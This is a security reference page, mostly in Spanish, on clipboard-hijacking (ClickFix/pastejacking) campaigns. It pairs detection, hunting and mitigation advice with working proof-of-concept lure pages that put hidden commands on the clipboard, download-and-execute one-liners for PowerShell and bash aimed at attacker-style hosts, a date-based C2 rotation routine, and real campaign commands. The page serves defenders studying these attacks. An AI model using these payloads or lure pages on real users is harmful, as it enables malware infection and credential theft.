# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Nunca pegues algo que no hayas copiado tú mismo." – consejo antiguo pero aún válido

## Resumen

Clipboard hijacking – also known as *pastejacking* – aprovecha el hecho de que los usuarios rutinariamente copian y pegan comandos sin inspeccionarlos. Una página web maliciosa (o cualquier contexto capaz de ejecutar JavaScript, como una aplicación Electron o Desktop) coloca programáticamente texto controlado por el atacante en el clipboard del sistema. Las víctimas son inducidas, normalmente mediante instrucciones de ingeniería social cuidadosamente diseñadas, a pulsar **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), o a abrir un terminal y *pegar* el contenido del clipboard, ejecutando inmediatamente comandos arbitrarios.

Debido a que **no se descarga ningún archivo y no se abre ningún attachment**, la técnica evade la mayoría de los controles de seguridad de correo electrónico y contenido web que supervisan attachments, macros o la ejecución directa de comandos. Por ello el ataque es popular en campañas de phishing que distribuyen familias de malware commodity como NetSupport RAT, Latrodectus loader o Lumma Stealer.

## Forced copy buttons and hidden payloads (macOS one-liners)

Algunos infostealers para macOS clonan sitios de instaladores (p. ej., Homebrew) y **obligan el uso de un botón “Copy”** para que los usuarios no puedan resaltar solo el texto visible. La entrada del clipboard contiene el comando de instalación esperado más una carga Base64 anexada (p. ej., `...; echo <b64> | base64 -d | sh`), de modo que un solo pegado ejecuta ambos mientras la UI oculta la etapa extra.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Campañas antiguas usaban `document.execCommand('copy')`, las más recientes se basan en la asíncrona **Clipboard API** (`navigator.clipboard.writeText`).

## El flujo de ClickFix / ClearFake

1. El usuario visita un sitio typosquatted o comprometido (p. ej. `docusign.sa[.]com`)
2. El JavaScript inyectado **ClearFake** llama a un helper `unsecuredCopyToClipboard()` que silenciosamente almacena en el portapapeles un one-liner de PowerShell codificado en Base64.
3. Las instrucciones HTML le indican a la víctima: *“Pulse **Win + R**, pegue el comando y presione Enter para resolver el problema.”*
4. `powershell.exe` se ejecuta, descargando un archivo que contiene un ejecutable legítimo más una DLL maliciosa (classic DLL sideloading).
5. El loader descifra etapas adicionales, inyecta shellcode e instala persistence (p. ej., scheduled task) – en última instancia ejecutando NetSupport RAT / Latrodectus / Lumma Stealer.

### Ejemplo de cadena NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (Java WebStart legítimo) busca en su directorio `msvcp140.dll`.
* La DLL maliciosa resuelve dinámicamente APIs con **GetProcAddress**, descarga dos binarios (`data_3.bin`, `data_4.bin`) vía **curl.exe**, los descifra usando una rolling XOR key `"https://google.com/"`, inyecta el shellcode final y descomprime **client32.exe** (NetSupport RAT) en `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Descarga `la.txt` con **curl.exe**
2. Ejecuta el JScript downloader dentro de **cscript.exe**
3. Recupera un payload MSI → deja `libcef.dll` junto a una aplicación firmada → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer vía MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
La llamada **mshta** inicia un script PowerShell oculto que recupera `PartyContinued.exe`, extrae `Boat.pst` (CAB), reconstruye `AutoIt3.exe` mediante `extrac32` y concatenación de archivos, y finalmente ejecuta un script `.a3x` que exfiltra credenciales de navegador a `sumeriavgv.digital`.

## ClickFix: Portapapeles → PowerShell → JS eval → Startup LNK con C2 rotativo (PureHVNC)

Algunas campañas ClickFix omiten por completo las descargas de archivos e indican a las víctimas que peguen un comando de una línea que obtiene y ejecuta JavaScript vía WSH, lo persiste y rota C2 diariamente. Cadena observada de ejemplo:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Características clave
- URL ofuscada invertida en tiempo de ejecución para derrotar la inspección casual.
- JavaScript se persiste mediante un Startup LNK (WScript/CScript), y selecciona el C2 según el día actual – permitiendo una rotación rápida de dominios.

Fragmento JS mínimo usado para rotar C2s por fecha:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
La siguiente etapa suele desplegar un loader que establece persistencia y descarga un RAT (p. ej., PureHVNC), con frecuencia fijando TLS a un certificado codificado y fragmentando el tráfico.

Detection ideas specific to this variant
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (or `cscript.exe`).
- Startup artifacts: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` invoking WScript/CScript with a JS path under `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU and command‑line telemetry containing `.split('').reverse().join('')` or `eval(a.responseText)`.
- Repeated `powershell -NoProfile -NonInteractive -Command -` with large stdin payloads to feed long scripts without long command lines.
- Scheduled Tasks that subsequently execute LOLBins such as `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` under an updater‑looking task/path (e.g., `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Hostnames y URLs de C2 que rotan diariamente con el patrón `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Correlacionar eventos de clipboard Write seguidos por un pegado con Win+R y la ejecución inmediata de `powershell.exe`.

Blue-teams can combine clipboard, process-creation and registry telemetry to pinpoint pastejacking abuse:

* Registro de Windows: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` mantiene un historial de **Win + R** commands – buscar entradas inusuales en Base64 / ofuscadas.
* Evento de seguridad ID **4688** (Process Creation) donde `ParentImage` == `explorer.exe` y `NewProcessName` en { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** por creaciones de archivos bajo `%LocalAppData%\Microsoft\Windows\WinX\` o carpetas temporales justo antes del evento 4688 sospechoso.
* Sensores de clipboard de EDR (si están presentes) – correlacionar `Clipboard Write` seguido inmediatamente por un nuevo proceso PowerShell.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Campañas recientes producen en masa páginas de verificación falsas de CDN/browser ("Just a moment…", IUAM-style) que obligan a los usuarios a copiar comandos específicos del OS desde su clipboard hacia consolas nativas. Esto pivota la ejecución fuera del sandbox del navegador y funciona tanto en Windows como macOS.

Key traits of the builder-generated pages
- Detección del OS vía `navigator.userAgent` para adaptar payloads (Windows PowerShell/CMD vs. macOS Terminal). Decoys/no-ops opcionales para OS no soportados para mantener la ilusión.
- Copia automática al clipboard tras acciones benignas de UI (checkbox/Copy) mientras que el texto visible puede diferir del contenido del clipboard.
- Bloqueo móvil y un popover con instrucciones paso a paso: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Ofuscación opcional y un injector de un solo archivo para sobreescribir el DOM de un sitio comprometido con una UI de verificación con estilo Tailwind (no se requiere registrar un dominio nuevo).

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
Persistencia en macOS de la ejecución inicial
- Usar `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` para que la ejecución continúe después de que se cierre el terminal, reduciendo artefactos visibles.

Toma de control in situ de páginas en sitios comprometidos
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Ideas de detección y hunting específicas para cebos estilo IUAM
- Web: Páginas que vinculan Clipboard API a widgets de verificación; incongruencia entre el texto mostrado y el clipboard payload; branching por `navigator.userAgent`; Tailwind + reemplazo single-page en contextos sospechosos.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` poco después de una interacción del navegador; batch/MSI installers ejecutados desde `%TEMP%`.
- macOS endpoint: Terminal/iTerm que generan `bash`/`curl`/`base64 -d` con `nohup` cerca de eventos del navegador; jobs en segundo plano que sobreviven al cierre del terminal.
- Correlacionar historial `RunMRU` (Win+R) y clipboard writes con la posterior creación de procesos de consola.

See also for supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix evolutions (ClearFake, Scarlet Goldfinch)

- ClearFake continúa comprometiendo sitios WordPress e inyectando loader JavaScript que encadena hosts externos (Cloudflare Workers, GitHub/jsDelivr) e incluso llamadas de blockchain “etherhiding” (p. ej., POSTs a endpoints de la API de Binance Smart Chain como `bsc-testnet.drpc[.]org`) para obtener la lógica actual del cebo. Las overlays recientes usan ampliamente fake CAPTCHAs que indican a los usuarios copiar/pegar un one-liner (T1204.004) en lugar de descargar nada.
- La ejecución inicial se delega cada vez más a signed script hosts/LOLBAS. En enero de 2026, las cadenas cambiaron el uso anterior de `mshta` por el componente integrado `SyncAppvPublishingServer.vbs` ejecutado mediante `WScript.exe`, pasando argumentos estilo PowerShell con alias/wildcards para obtener contenido remoto:
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` está firmado y normalmente es usado por App-V; combinado con `WScript.exe` y argumentos inusuales (`gal`/`gcm` aliases, wildcarded cmdlets, jsDelivr URLs) se convierte en una etapa LOLBAS de alta señal para ClearFake.
- En febrero de 2026, los fake CAPTCHA payloads volvieron a los download cradles puramente en PowerShell. Dos ejemplos en vivo:
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- La primera cadena es un grabber in-memory `iex(irm ...)`; la segunda hace stage vía `WinHttp.WinHttpRequest.5.1`, escribe un `.ps1` temporal y luego lo lanza con `-ep bypass` en una ventana oculta.

Detection/hunting tips for these variants
- Process lineage: navegador → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` o PowerShell cradles inmediatamente después de escrituras en el portapapeles/Win+R.
- Command-line keywords: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domains, or raw IP `iex(irm ...)` patterns.
- Network: conexiones salientes a CDN worker hosts o blockchain RPC endpoints desde script hosts/PowerShell poco después de la navegación web.
- File/registry: creación de `.ps1` temporal bajo `%TEMP%` además de entradas RunMRU que contienen estos one-liners; bloquear/alertar sobre signed-script LOLBAS (WScript/cscript/mshta) ejecutándose con URLs externas o cadenas alias ofuscadas.

## Mitigations

1. Endurecimiento del navegador – deshabilitar el acceso de escritura al portapapeles (`dom.events.asyncClipboard.clipboardItem` etc.) o requerir gesto del usuario.
2. Security awareness – enseñar a los usuarios a *escribir* comandos sensibles o pegarlos primero en un editor de texto.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control para bloquear one-liners arbitrarios.
4. Controles de red – bloquear solicitudes salientes a dominios conocidos de pastejacking y malware C2.

## Trucos relacionados

* **Discord Invite Hijacking** a menudo abusa del mismo enfoque ClickFix después de atraer a los usuarios a un servidor malicioso:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)

{{#include ../../banners/hacktricks-training.md}}
